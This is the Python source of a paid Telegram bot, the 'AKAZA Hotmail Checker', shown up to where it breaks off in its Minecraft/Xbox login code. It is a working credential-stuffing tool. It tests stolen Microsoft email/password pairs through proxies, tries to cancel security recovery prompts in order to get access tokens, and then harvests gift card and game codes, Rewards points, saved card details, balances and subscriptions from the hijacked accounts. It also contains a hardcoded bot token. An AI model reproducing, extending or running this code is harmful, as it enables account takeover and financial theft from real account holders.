#!/usr/bin/env python3
"""
AKAZA Hotmail Checker — @larpsupport
Railway compatible | Python 3.11+ | No f-string backslashes
"""

import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
from datetime import datetime, timedelta
from urllib.parse import quote, unquote, urlparse, parse_qs
import requests, urllib3
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# CONFIG
# ============================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")
ADMIN_ID  = int(os.environ.get("ADMIN_ID", "5944410248"))
DB_PATH   = os.environ.get("DB_PATH", "checker.db")
TAG       = "@larpsupport"
BUY_MSG   = "Contact @larpsupport to purchase access."

SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

PROXIES_LIST: list = []
bot_executor = ThreadPoolExecutor(max_workers=500)
user_fast_mode: dict = {}

# ============================================================================
# EXCLUDE WORDS
# ============================================================================
EXCLUDE_WORDS = {
    'SWEEPSTAKES','STATUS','WINORDER','CONTEST','PLAGUE','REQUIEM','CUSTOM',
    'BUNDLEORDER','SURFACE','PROORDER','SERIES','POINTS','DONATION','CHILDREN',
    'RESEARCH','HOSPITALORDE','EDUCATION','EMPLOYMENTOR','RIGHTS','YOUORDER',
    'SEDSORDER','ATAORDER','CARDORDER','MICROSOFT','PRESENTKORT','KRORDER',
    'OFT-PRE','DIGITAL','COINSORDER','MOEDAS','OVERWATCHORD','MONEDASORDER',
    'ASSINATURA','GRATUITA','SPOTIFY','PREMIUM','MESESORDER','PRESENTE',
    'RESALET','NOURORDER','FOUNDATIONOR','YACOUB','LEAGUE','LEGENDS','RPORDER',
    'OVERWATCH','GAME','PASS','MINECOINS','ROBUX','GIFT','CARD','ORDER','CODE',
    'FOUND','DIGITAL-CODE','REDEMPTION','REDEEM','DOWNLOAD','INSTANT','DELIVERY',
    'ONLINE','ACCESS','CONTENT','DLC','EXPANSION','SEASON','TOKEN','CURRENCY',
    'VIRTUAL','ITEM'
}

# ============================================================================
# SERVICE KEYWORDS — 100+ services
# ============================================================================
SERVICE_KEYWORDS = {
    "instagram.com": "Instagram", "mail.instagram.com": "Instagram",
    "facebook.com": "Facebook", "facebookmail.com": "Facebook",
    "twitter.com": "Twitter/X", "x.com": "Twitter/X",
    "tiktok.com": "TikTok", "snapchat.com": "Snapchat",
    "discord.com": "Discord", "discordapp.com": "Discord",
    "telegram.org": "Telegram", "reddit.com": "Reddit",
    "linkedin.com": "LinkedIn", "twitch.tv": "Twitch",
    "onlyfans.com": "OnlyFans", "patreon.com": "Patreon",
    "vk.com": "VK", "youtube.com": "YouTube", "pinterest.com": "Pinterest",
    "netflix.com": "Netflix", "info@netflix.com": "Netflix",
    "spotify.com": "Spotify", "disneyplus.com": "Disney+",
    "hulu.com": "Hulu", "hbo.com": "HBO Max", "hbomax.com": "HBO Max",
    "primevideo.com": "Prime Video", "peacocktv.com": "Peacock",
    "paramountplus.com": "Paramount+", "tidal.com": "Tidal",
    "deezer.com": "Deezer", "soundcloud.com": "SoundCloud",
    "xbox.com": "Xbox", "xboxlive.com": "Xbox",
    "playstation.com": "PlayStation",
    "sony@txn-email.playstation.com": "PlayStation",
    "nintendo.com": "Nintendo",
    "steampowered.com": "Steam", "noreply@steampowered.com": "Steam",
    "epicgames.com": "Epic Games", "riotgames.com": "Riot Games",
    "ubisoft.com": "Ubisoft", "ea.com": "EA", "blizzard.com": "Blizzard",
    "minecraft.net": "Minecraft", "roblox.com": "Roblox",
    "garena.com": "Garena", "rockstargames.com": "Rockstar",
    "bethesda.net": "Bethesda", "capcom.com": "Capcom",
    "square-enix.com": "Square Enix", "bandainamco.com": "Bandai Namco",
    "noreply@id.supercell.com": "Supercell", "supercell.com": "Supercell",
    "paypal.com": "PayPal", "venmo.com": "Venmo", "cash.app": "CashApp",
    "stripe.com": "Stripe", "revolut.com": "Revolut", "wise.com": "Wise",
    "coinbase.com": "Coinbase", "binance.com": "Binance",
    "kraken.com": "Kraken", "robinhood.com": "Robinhood",
    "blockchain.com": "Blockchain",
    "amazon.com": "Amazon", "ebay.com": "eBay",
    "aliexpress.com": "AliExpress", "etsy.com": "Etsy",
    "walmart.com": "Walmart", "target.com": "Target",
    "shopify.com": "Shopify", "nike.com": "Nike", "adidas.com": "Adidas",
    "ubereats.com": "Uber Eats", "doordash.com": "DoorDash",
    "grubhub.com": "GrubHub", "deliveroo.com": "Deliveroo",
    "uber.com": "Uber", "lyft.com": "Lyft", "airbnb.com": "Airbnb",
    "booking.com": "Booking", "expedia.com": "Expedia",
    "dropbox.com": "Dropbox", "icloud.com": "iCloud",
    "nordvpn.com": "NordVPN", "expressvpn.com": "ExpressVPN",
    "surfshark.com": "Surfshark", "protonvpn.com": "ProtonVPN",
    "coursera.org": "Coursera", "udemy.com": "Udemy",
    "duolingo.com": "Duolingo", "grammarly.com": "Grammarly",
    "adobe.com": "Adobe", "canva.com": "Canva",
    "zoom.us": "Zoom", "slack.com": "Slack", "notion.so": "Notion",
}

# ============================================================================
# DATABASE
# ============================================================================
class AkazaDB:
    def __init__(self, path):
        self.path = path
        self._init()

    def _c(self):
        return sqlite3.connect(self.path, check_same_thread=False)

    def _init(self):
        with self._c() as c:
            c.execute("""CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
                total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
                join_date TEXT, access_expiry TEXT)""")
            c.execute("""CREATE TABLE IF NOT EXISTS settings (
                user_id INTEGER PRIMARY KEY,
                keywords TEXT DEFAULT '[]', threads INTEGER DEFAULT 10)""")
            c.execute("""CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)""")

    def add_user(self, uid, username, first_name):
        with self._c() as c:
            c.execute("INSERT OR IGNORE INTO users (user_id,username,first_name,join_date) VALUES (?,?,?,?)",
                      (uid, username or '', first_name or '', datetime.now().isoformat()))
            c.execute("INSERT OR IGNORE INTO settings (user_id) VALUES (?)", (uid,))

    def is_banned(self, uid):
        if uid == ADMIN_ID: return False
        with self._c() as c:
            r = c.execute("SELECT is_banned FROM users WHERE user_id=?", (uid,)).fetchone()
            return bool(r and r[0])

    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        with self._c() as c:
            r = c.execute("SELECT has_access,is_banned,access_expiry FROM users WHERE user_id=?", (uid,)).fetchone()
            if not r: return False
            has, banned, expiry = r
            if banned or not has: return False
            if expiry:
                try:
                    if datetime.fromisoformat(expiry) < datetime.now():
                        c.execute("UPDATE users SET has_access=0 WHERE user_id=?", (uid,))
                        return False
                except Exception:
                    pass
            return True

    def is_mod(self, uid):
        if uid == ADMIN_ID: return True
        with self._c() as c:
            r = c.execute("SELECT is_mod FROM users WHERE user_id=?", (uid,)).fetchone()
            return bool(r and r[0])

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        with self._c() as c:
            r = c.execute("SELECT credits FROM users WHERE user_id=?", (uid,)).fetchone()
            return r[0] if r else 0

    def add_credits(self, uid, n):
        with self._c() as c:
            c.execute("UPDATE users SET credits=credits+? WHERE user_id=?", (n, uid))

    def set_credits(self, uid, n):
        with self._c() as c:
            c.execute("UPDATE users SET credits=? WHERE user_id=?", (n, uid))

    def reset_credits(self, uid):
        self.set_credits(uid, 0)

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        with self._c() as c:
            c.execute("UPDATE users SET credits=MAX(0,credits-1),total_checks=total_checks+1 WHERE user_id=?", (uid,))

    def add_hit(self, uid):
        with self._c() as c:
            c.execute("UPDATE users SET total_hits=total_hits+1 WHERE user_id=?", (uid,))

    def grant(self, uid):
        with self._c() as c:
            c.execute("UPDATE users SET has_access=1,access_expiry=NULL WHERE user_id=?", (uid,))

    def revoke(self, uid):
        with self._c() as c:
            c.execute("UPDATE users SET has_access=0 WHERE user_id=?", (uid,))

    def grant_timed(self, uid, days):
        exp = (datetime.now() + timedelta(days=days)).isoformat()
        with self._c() as c:
            c.execute("UPDATE users SET has_access=1,access_expiry=? WHERE user_id=?", (exp, uid))

    def ban(self, uid):
        with self._c() as c:
            c.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (uid,))

    def unban(self, uid):
        with self._c() as c:
            c.execute("UPDATE users SET is_banned=0 WHERE user_id=?", (uid,))

    def set_mod(self, uid, val):
        with self._c() as c:
            c.execute("UPDATE users SET is_mod=? WHERE user_id=?", (val, uid))

    def all_uids(self):
        with self._c() as c:
            return [r[0] for r in c.execute("SELECT user_id FROM users").fetchall()]

    def user_info(self, uid):
        with self._c() as c:
            r = c.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
            if not r: return None
            cols = ['user_id','username','first_name','credits','has_access',
                    'is_banned','is_mod','total_checks','total_hits','join_date','access_expiry']
            return dict(zip(cols, r))

    def get_settings(self, uid):
        with self._c() as c:
            r = c.execute("SELECT keywords,threads FROM settings WHERE user_id=?", (uid,)).fetchone()
            if not r: return {'keywords': [], 'threads': 10}
            try:
                kws = json.loads(r[0]) if r[0] else []
            except Exception:
                kws = []
            return {'keywords': kws, 'threads': r[1] or 10}

    def update_settings(self, uid, keywords=None, threads=None):
        s = self.get_settings(uid)
        if keywords is not None: s['keywords'] = keywords
        if threads  is not None: s['threads']  = threads
        with self._c() as c:
            c.execute("INSERT OR REPLACE INTO settings (user_id,keywords,threads) VALUES (?,?,?)",
                      (uid, json.dumps(s['keywords']), s['threads']))

    def save_result(self, uid, email, status, details):
        with self._c() as c:
            c.execute("INSERT INTO results (user_id,email,status,details,date) VALUES (?,?,?,?,?)",
                      (uid, email, status, json.dumps(details, default=str), datetime.now().isoformat()))

    def user_stats(self, uid):
        info = self.user_info(uid)
        if not info: return {'credits': 0, 'checks': 0, 'hits': 0}
        return {'credits': info['credits'], 'checks': info['total_checks'], 'hits': info['total_hits']}

    def global_stats(self):
        with self._c() as c:
            total  = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            active = c.execute("SELECT COUNT(*) FROM users WHERE has_access=1 AND is_banned=0").fetchone()[0]
            checks = c.execute("SELECT SUM(total_checks) FROM users").fetchone()[0] or 0
            hits   = c.execute("SELECT SUM(total_hits) FROM users").fetchone()[0] or 0
            return {'total': total, 'active': active, 'checks': checks, 'hits': hits}

    def list_mods(self):
        with self._c() as c:
            return [{'uid': r[0], 'username': r[1]}
                    for r in c.execute("SELECT user_id,username FROM users WHERE is_mod=1").fetchall()]

    def top_users(self, limit=10):
        with self._c() as c:
            return c.execute(
                "SELECT user_id,username,credits,has_access,total_checks,total_hits "
                "FROM users ORDER BY total_hits DESC LIMIT ?", (limit,)).fetchall()

DB = AkazaDB(DB_PATH)

# ============================================================================
# CHECKER ENGINE — flux.py login for max CPM
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                           'AppleWebKit/537.36 (KHTML, like Gecko) '
                           'Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        if proxy:
            p = self._fmt_proxy(proxy)
            self.session.proxies = {'http': p, 'https': p}

    def _fmt_proxy(self, proxy):
        proxy = proxy.strip()
        if proxy.startswith(('http://', 'https://', 'socks')):
            return proxy
        parts = proxy.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return 'http://' + user + ':' + pwd + '@' + ip + ':' + port
        return 'http://' + proxy

    # ── get PPFT + urlPost (flux.py) ──
    def _get_sftag(self):
        for _ in range(3):
            try:
                hdrs = {
                    'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                   'AppleWebKit/537.36 (KHTML, like Gecko) '
                                   'Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                text = self.session.get(SFTAG_URL, headers=hdrs, timeout=10, verify=False).text
                ppft = (
                    re.search(r'value=\\\\"(.+?)\\\\"', text, re.S) or
                    re.search(r'value="(.+?)"', text, re.S) or
                    re.search(r"sFTTag:'(.+?)'", text, re.S) or
                    re.search(r'sFTTag:"(.+?)"', text, re.S) or
                    re.search(r'name="PPFT".*?value="(.+?)"', text, re.S)
                )
                if ppft:
                    urlp = (
                        re.search(r'"urlPost":"(.+?)"', text, re.S) or
                        re.search(r"urlPost:'(.+?)'", text, re.S) or
                        re.search(r'<form.*?action="(.+?)"', text, re.S)
                    )
                    if urlp:
                        return urlp.group(1).replace('&amp;', '&'), ppft.group(1)
            except Exception:
                pass
            time.sleep(0.1)
        return None, None

    # ── login (flux.py exact) ──
    def _login(self, email, password, urlpost, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                hdrs = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                   'AppleWebKit/537.36 (KHTML, like Gecko) '
                                   'Chrome/91.0.4472.124 Safari/537.36'),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'close',
                }
                resp = self.session.post(urlpost, data=data, headers=hdrs,
                                         allow_redirects=True, timeout=10, verify=False)
                # SUCCESS — token in URL fragment
                if '#' in resp.url and resp.url != SFTAG_URL:
                    token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
                    if token and token != 'None':
                        return 'TOKEN', token
                # 2FA recovery flow
                elif 'cancel?mkt=' in resp.text:
                    try:
                        ipt   = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
                        uaid  = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
                        if ipt and pprid and uaid:
                            d2  = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            act = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
                            if act:
                                r2 = self.session.post(act.group(), data=d2,
                                                       allow_redirects=True, timeout=10, verify=False)
                                ru = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', r2.text)
                                if ru:
                                    fin = self.session.get(ru.group(), allow_redirects=True,
                                                           timeout=10, verify=False)
                                    tk = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if tk and tk != 'None':
                                        return 'TOKEN', tk
                    except Exception:
                        pass
                    return '2FA', None
                elif any(v in resp.text for v in [
                    'recover?mkt', 'account.live.com/identity/confirm?mkt',
                    'Email/Confirm?mkt', '/Abuse?mkt='
                ]):
                    return '2FA', None
                elif any(v in resp.text.lower() for v in [
                    'password is incorrect', "account doesn't exist",
                    "that microsoft account doesn't exist",
                    'sign in to your microsoft account',
                    'tried to sign in too many times',
                    'help us protect your account',
                ]):
                    return 'BAD', None
            except Exception:
                pass
            time.sleep(0.1)
        return 'BAD', None

    def _fmhf(self, resp):
        for _ in range(5):
            try:
                soup = BeautifulSoup(resp.text, 'html.parser')
                form = soup.find('form', id='fmHF')
                if not form: break
                act = form.get('action', '')
                if not act: break
                if act.startswith('/'): act = 'https://login.live.com' + act
                fd = {i.get('name'): i.get('value', '')
                      for i in form.find_all('input') if i.get('name')}
                resp = self.session.post(act, data=fd, allow_redirects=True, timeout=10, verify=False)
            except Exception:
                break
        return resp

    # ── Rewards Points ──
    def _get_points(self):
        hdrs = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Referer': 'https://rewards.bing.com/',
            'Accept': 'application/json, text/plain, */*',
        }
        try:
            r = self.session.get('https://rewards.bing.com/api/getuserinfo',
                                  headers=hdrs, timeout=8, verify=False)
            d = r.json()
            pts = (d.get('availablePoints') or
                   d.get('dashboard', {}).get('userStatus', {}).get('availablePoints'))
            if pts is not None and 0 <= int(pts) <= 500000:
                return int(pts)
        except Exception:
            pass
        try:
            r = self.session.get('https://www.bing.com/rewardsapp/flyoutHub?format=json',
                                  headers=hdrs, timeout=8, verify=False)
            pts = r.json().get('userInfo', {}).get('balance')
            if pts is not None and 0 <= int(pts) <= 500000:
                return int(pts)
        except Exception:
            pass
        try:
            r = self.session.get('https://rewards.bing.com', headers=hdrs, timeout=10, verify=False)
            if 'fmHF' in r.text:
                r = self._fmhf(r)
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m:
                pts = int(m.group(1))
                if 0 <= pts <= 500000:
                    return pts
        except Exception:
            pass
        return 0

    # ── Redemption Codes (flux.py) ──
    def _get_codes(self):
        found = []
        CODE_PATS = [
            r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
            r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
            r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
        ]
        try:
            url  = 'https://rewards.bing.com/redeem/orderhistory'
            hdrs = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0',
                'Referer': 'https://rewards.bing.com/',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            r    = self.session.get(url, headers=hdrs, timeout=10, verify=False)
            text = r.text
            if 'fmHF' in text or 'JavaScript required' in text:
                soup0 = BeautifulSoup(text, 'html.parser')
                form  = soup0.find('form', id='fmHF') or soup0.find('form', attrs={'name': 'fmHF'})
                if form and form.get('action'):
                    act = form['action']
                    if act.startswith('/'): act = 'https://login.live.com' + act
                    fd = {i.get('name'): i.get('value', '')
                          for i in form.find_all('input') if i.get('name')}
                    self.session.post(act, data=fd, timeout=10, verify=False, allow_redirects=True)
                    r2   = self.session.get(url, headers=hdrs, timeout=10, verify=False, allow_redirects=True)
                    text = r2.text
            soup      = BeautifulSoup(text, 'html.parser')
            ver_token = ''
            ti = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            if ti and ti.get('value'):
                ver_token = ti['value']
            table = soup.find('table', class_='table')
            rows  = []
            if table and table.tbody:
                rows = table.tbody.find_all('tr')
            elif table:
                rows = table.find_all('tr')
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3: continue
                full_row    = row.get_text(strip=True)
                order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ''
                order_date  = cells[1].get_text(strip=True) if len(cells) > 1 else ''
                cat = self._detect_cat(order_title, full_row)
                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act_url = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act_url.startswith('/'):
                        act_url = 'https://rewards.bing.com' + act_url
                    try:
                        pd = {}
                        if ver_token: pd['__RequestVerificationToken'] = ver_token
                        ch = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0',
                            'X-Requested-With': 'XMLHttpRequest',
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        }
                        cr    = self.session.post(act_url, data=pd, headers=ch, timeout=10, verify=False)
                        chtml = cr.text
                        csoup = BeautifulSoup(chtml, 'html.parser')
                        code  = None
                        # a) tango key/value
                        rs = csoup.find('div', class_='resendSuccess')
                        if rs:
                            keys = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                            vals = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                            for k, v in zip(keys, vals):
                                kt = k.get_text(strip=True).upper()
                                if 'CODE' in kt or 'PIN' in kt:
                                    cand = v.get_text(strip=True)
                                    if '*' not in cand:
                                        code = cand
                                        break
                        # b) regex
                        if not code:
                            for pat in CODE_PATS:
                                m = re.search(pat, chtml)
                                if m and '*' not in m.group(0) and m.group(0) not in EXCLUDE_WORDS:
                                    code = m.group(0)
                                    break
                        # c) PIN:
                        if not code:
                            m = re.search(r'PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', chtml, re.I)
                            if m and '*' not in m.group(1):
                                code = m.group(1)
                        # d) CODE:
                        if not code:
                            m = re.search(r'CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', chtml, re.I)
                            if m and '*' not in m.group(1):
                                code = m.group(1)
                        # e) pre/code tags
                        if not code:
                            for tag in csoup.find_all(['pre', 'code']):
                                t2 = tag.get_text(strip=True)
                                for pat in CODE_PATS:
                                    if re.match(pat, t2) and '*' not in t2:
                                        code = t2
                                        break
                                if code: break
                        # f) clipboard button
                        if not code:
                            for b2 in csoup.find_all('button', attrs={'data-clipboard-text': True}):
                                val = b2['data-clipboard-text'].strip()
                                if val and len(val) >= 15 and '*' not in val:
                                    code = val
                                    break
                        # g) generic fallback
                        if not code:
                            for c2 in re.findall(
                                r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}'
                                r'(?:-[A-Z0-9]{4})?(?:-[A-Z0-9]{4})?', chtml):
                                if '*' not in c2 and c2 not in EXCLUDE_WORDS:
                                    code = c2
                                    break
                        # redemption URL for gift cards
                        rurl = ''
                        ci   = self._code_info(order_title, cat, full_row)
                        if any(x in ci.lower() for x in ['gift', 'card', '$', 'amazon', 'spotify']):
                            for up in [
                                r"<div class=['\"]tango-credential-key['\"]>"
                                r"<a href=['\"]([^'\"]*)['\"][^>]*>Redemption URL</a></div>",
                                r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>',
                                r'<a[^>]*href="([^"]*)"[^>]*>Redeem</a>',
                                r'href="([^"]*redeem[^"]*)"',
                                r'Redemption URL:\s*(https?://[^\s<>"\']+)',
                            ]:
                                um = re.search(up, chtml, re.I | re.DOTALL)
                                if um:
                                    rurl = um.group(1).strip()
                                    break
                        if code:
                            found.append({
                                'code': code, 'category': cat, 'info': ci,
                                'redemption_url': rurl,
                                'date': order_date or datetime.now().strftime('%Y-%m-%d'),
                            })
                    except Exception:
                        continue
                else:
                    code_cell = cells[3] if len(cells) > 3 else cells[2]
                    for pat in CODE_PATS:
                        for c2 in re.findall(pat, code_cell.get_text(strip=True).upper()):
                            if '*' in c2 or c2 in EXCLUDE_WORDS: continue
                            if len(c2.split('-')) < 3: continue
                            found.append({
                                'code': c2, 'category': cat,
                                'info': self._code_info(order_title, cat, full_row),
                                'redemption_url': '', 'date': order_date,
                            })
            if not rows:
                for pat in CODE_PATS:
                    for c2 in re.findall(pat, soup.get_text().upper()):
                        if '*' in c2 or c2 in EXCLUDE_WORDS: continue
                        if sum(ch.isalnum() for ch in c2.replace('-', '')) < 8: continue
                        found.append({
                            'code': c2, 'category': 'Unknown',
                            'info': 'CODE FOUND', 'redemption_url': '', 'date': '',
                        })
        except Exception as e:
            logger.debug('Codes error: %s', e)
        return found

    def _detect_cat(self, title, row=''):
        t = (row or title).lower()
        if any(k in t for k in ['overwatch', 'owl tokens']): return 'Overwatch'
        if any(k in t for k in ['sea of thieves', 'ancient coins']): return 'Sea of Thieves'
        if any(k in t for k in ['roblox', 'robux']): return 'Roblox'
        if any(k in t for k in ['league of legends', 'riot points']): return 'League of Legends'
        if any(k in t for k in ['game pass', 'gamepass', 'xbox game pass']): return 'Game Pass'
        if any(k in t for k in ['minecraft', 'minecoins']): return 'Minecraft'
        if any(k in t for k in ['gift card', 'giftcard', 'amazon', 'steam gift',
                                  'playstation', 'nintendo gift', 'target', 'starbucks',
                                  'subway', 'doordash', 'uber', 'walmart',
                                  'spotify premium']): return 'Gift Card'
        return 'Unknown'

    def _code_info(self, title, cat, row=''):
        t = title.lower()
        if cat == 'Minecraft':
            m = re.search(r'(\d+)\s*(?:minecoins|coins)', t)
            return (m.group(1) + ' MINECOINS') if m else 'MINECRAFT CODE'
        if cat == 'Roblox':
            m = re.search(r'(\d+)\s*(?:robux|rbx)', t)
            return (m.group(1) + ' ROBUX') if m else 'ROBLOX CODE'
        if cat == 'League of Legends':
            m = re.search(r'(\d+)\s*(?:rp|riot)', t)
            return (m.group(1) + ' RP') if m else 'LOL CODE'
        if cat == 'Game Pass':
            m = re.search(r'(\d+)\s*month', t)
            return ((m.group(1) + ' MONTH GAME PASS') if m else 'GAME PASS CODE')
        if cat == 'Gift Card':
            m = re.search(r'\$(\d+)', t)
            amt = ('$' + m.group(1) + ' ') if m else ''
            for x in ['amazon', 'steam', 'playstation', 'xbox', 'nintendo',
                       'target', 'starbucks', 'subway', 'doordash', 'uber', 'walmart']:
                if x in t: return amt + x.upper() + ' GIFT CARD'
            return amt + 'GIFT CARD'
        return cat.upper() + ' CODE'

    # ── Microsoft Subs (hit.py) ──
    def _get_subs(self):
        result = {'status': 'FREE', 'subs': [], 'balance': '', 'card': ''}
        try:
            uid16 = uuid.uuid4().hex[:16]
            state = json.dumps({'userId': uid16, 'scopeSet': 'pidl'})
            surl  = (
                'https://login.live.com/oauth20_authorize.srf'
                '?client_id=000000000004773A'
                '&response_type=token'
                '&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete'
                '&redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth'
                '&state=' + quote(state) + '&prompt=none'
            )
            r = self.session.get(surl, headers={'Referer': 'https://account.microsoft.com/'},
                                  allow_redirects=True, timeout=15, verify=False)
            ptok = None
            for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                m = re.search(pat, r.text + ' ' + r.url)
                if m:
                    ptok = unquote(m.group(1))
                    break
            if not ptok: return result
            ph = {
                'Authorization': 'MSADELEGATE1.0="' + ptok + '"',
                'ms-cV': str(uuid.uuid4()),
                'Origin': 'https://account.microsoft.com',
                'Referer': 'https://account.microsoft.com/',
                'Accept': 'application/json',
            }
            try:
                rp = self.session.get(
                    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/'
                    'paymentInstrumentsEx?status=active,removed&language=en-US',
                    headers=ph, timeout=12, verify=False)
                bm = re.search(r'"balance"\s*:\s*([0-9.]+)', rp.text)
                if bm: result['balance'] = '$' + bm.group(1)
                cm = re.search(
                    r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"',
                    rp.text, re.DOTALL)
                if cm: result['card'] = cm.group(1)
            except Exception:
                pass
            try:
                rs = self.session.get(
                    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions',
                    headers=ph, timeout=12, verify=False)
                sub_kw = {
                    'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                    'PC Game Pass':            'PC GAME PASS',
                    'Xbox Game Pass':          'GAME PASS',
                    'EA Play':                 'EA PLAY',
                    'Xbox Live Gold':          'XBOX LIVE GOLD',
                    'Microsoft 365 Family':    'M365 FAMILY',
                    'Microsoft 365 Personal':  'M365 PERSONAL',
                    'Office 365':              'OFFICE 365',
                    'OneDrive':                'ONEDRIVE',
                }
                for kw, name in sub_kw.items():
                    if kw in rs.text:
                        sub = {'name': name}
                        ren = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', rs.text)
                        if ren:
                            sub['renewal'] = ren.group(1)
                            try:
                                d = (datetime.fromisoformat(ren.group(1)) - datetime.now()).days
                                sub['days'] = d
                                sub['expired'] = d < 0
                            except Exception:
                                pass
                        ar = re.search(r'"autoRenew"\s*:\s*(true|false)', rs.text)
                        if ar: sub['auto_renew'] = ar.group(1) == 'true'
                        result['subs'].append(sub)
                if result['subs']:
                    active = [s for s in result['subs'] if not s.get('expired')]
                    result['status'] = 'PREMIUM' if active else 'EXPIRED'
            except Exception:
                pass
        except Exception:
            pass
        return result

    # ── Profile ──
    def _get_profile(self, access_token, cid):
        try:
            hdrs = {
                'Authorization': 'Bearer ' + access_token,
                'X-AnchorMailbox': 'CID:' + cid,
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
            }
            r    = self.session.get(
                'https://substrate.office.com/profileb2/v2.0/me/V1Profile',
                headers=hdrs, timeout=10, verify=False)
            data = r.json()
            accs = data.get('accounts', [{}])
            name    = accs[0].get('displayName') or data.get('displayName') or 'Unknown'
            country = (accs[0].get('location') or accs[0].get('country')
                       or data.get('country') or 'Unknown')
            return name, country
        except Exception:
            return 'Unknown', 'Unknown'

    # ── Minecraft ──
    def _get_minecraft(self, access_token):
        try:
            xbl = self.session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    'Properties': {
                        'AuthMethod': 'RPS',
                        'SiteName': 'user.auth.xboxlive.com',
                        'RpsTicket': 'd=' + access_token,
                    },
